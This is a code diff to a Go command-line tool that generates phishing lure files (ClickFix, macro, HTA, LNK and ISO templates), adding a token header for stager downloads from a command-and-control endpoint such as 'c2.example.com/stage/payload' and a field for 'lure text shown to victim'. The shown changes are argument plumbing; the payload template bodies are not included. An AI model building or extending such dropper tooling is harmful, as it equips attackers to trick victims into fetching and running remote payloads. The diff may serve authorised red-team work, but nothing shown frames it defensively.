@@ -41,7 +41,8 @@ iso        ISO contents listing (autorun.inf + payload copy command)
 
 func init() {
 	templateCmd.Flags().String("type", "", "Template type: clickfix|macro|hta|lnk|iso (required)")
-	templateCmd.Flags().String("url", "", "Stage URL (stager downloads from here)")
+	templateCmd.Flags().String("url", "", "Stage endpoint URL (e.g. https://c2.example.com/stage/payload)")
+	templateCmd.Flags().String("token", "", "Stage token — sent as X-Stage-Token header (required with --url)")
 	templateCmd.Flags().String("stager-file", "", "Local stager EXE file (embedded in output)")
 	templateCmd.Flags().String("lure", "", "Lure text shown to victim")
 	templateCmd.Flags().String("output", "", "Output file path")
@@ -51,6 +52,7 @@ func init() {
 func runTemplate(cmd *cobra.Command, _ []string) error {
 	ttype, _ := cmd.Flags().GetString("type")
 	url, _ := cmd.Flags().GetString("url")
+	token, _ := cmd.Flags().GetString("token")
 	stagerFile, _ := cmd.Flags().GetString("stager-file")
 	lure, _ := cmd.Flags().GetString("lure")
 	output, _ := cmd.Flags().GetString("output")
@@ -78,13 +80,13 @@ func runTemplate(cmd *cobra.Command, _ []string) error {
 		if url == "" {
 			return fmt.Errorf("--url required for macro template")
 		}
-		data, ext = []byte(templateVBA(url)), ".bas"
+		data, ext = []byte(templateVBA(url, token)), ".bas"
 
 	case "hta":
 		if url == "" && len(stagerBytes) == 0 {
 			return fmt.Errorf("--url or --stager-file required for hta template")
 		}
-		data, ext = []byte(templateHTA(url, stagerBytes)), ".hta"
+		data, ext = []byte(templateHTA(url, token, stagerBytes)), ".hta"
 
 	case "lnk":
 		if url == "" {
